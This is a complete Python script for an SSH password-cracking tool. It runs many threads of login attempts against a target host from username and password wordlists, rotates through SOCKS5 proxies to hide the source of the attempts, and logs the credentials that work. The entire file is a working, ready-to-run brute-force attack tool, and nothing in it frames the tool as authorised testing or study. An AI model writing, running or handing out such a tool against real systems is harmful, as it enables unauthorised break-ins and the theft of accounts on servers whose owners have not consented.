import warnings
from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

import paramiko
import concurrent.futures
import logging
import itertools
import socks
import socket
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to attempt an SSH connection
def ssh_connect(hostname, port, username, password, timeout=5, proxy=None):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if proxy:
            sock = socks.socksocket()
            sock.set_proxy(proxy['type'], proxy['addr'], proxy['port'])
            sock.connect((hostname, port))
            transport = paramiko.Transport(sock)
            transport.connect(username=username, password=password)
            client._transport = transport
        else:
            client.connect(hostname, port, username, password, timeout=timeout)
        
        logging.info(f"[+] Success: {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        logging.warning(f"[-] Authentication failed: {username}:{password}")
        return False
    except Exception as e:
        logging.error(f"[*] Connection error: {str(e)}")
        return False
    finally:
        client.close()

# Function to manage threads
def crack_ssh(hostname, port, usernames, passwords, max_workers=10, get_proxy=None, timeout=5):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(ssh_connect, hostname, port, username, password, timeout, get_proxy())
            for username, password in itertools.product(usernames, passwords)
        ]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                # Stop further attempts on success
                executor.shutdown(wait=False)
                break

# Function to get a proxy from the list
def get_proxy(proxies, index):
    return proxies[index % len(proxies)]

# Main function for CLI
def main():
    parser = argparse.ArgumentParser(description="SSH Cracker with Professional Features")
    parser.add_argument('host', help='Target hostname or IP address')
    parser.add_argument('port', type=int, help='Target SSH port')
    parser.add_argument('usernames', help='File containing list of usernames')
    parser.add_argument('passwords', help='File containing list of passwords')
    parser.add_argument('--max-workers', type=int, default=10, help='Maximum number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds')
    parser.add_argument('--proxy-list', help='File containing list of proxies')
    args = parser.parse_args()

    with open(args.usernames, 'r') as f:
        usernames = [line.strip() for line in f]
    
    with open(args.passwords, 'r') as f:
        passwords = [line.strip() for line in f]
    
    proxies = []
    if args.proxy_list:
        with open(args.proxy_list, 'r') as f:
            proxies = [{'type': socks.SOCKS5, 'addr': line.split(':')[0], 'port': int(line.split(':')[1])} for line in f]
    
    proxy_index = 0
    def get_next_proxy():
        nonlocal proxy_index
        proxy = get_proxy(proxies, proxy_index) if proxies else None
        proxy_index += 1
        return proxy

    crack_ssh(args.host, args.port, usernames, passwords, args.max_workers, get_next_proxy, args.timeout)

if __name__ == '__main__':
    main()
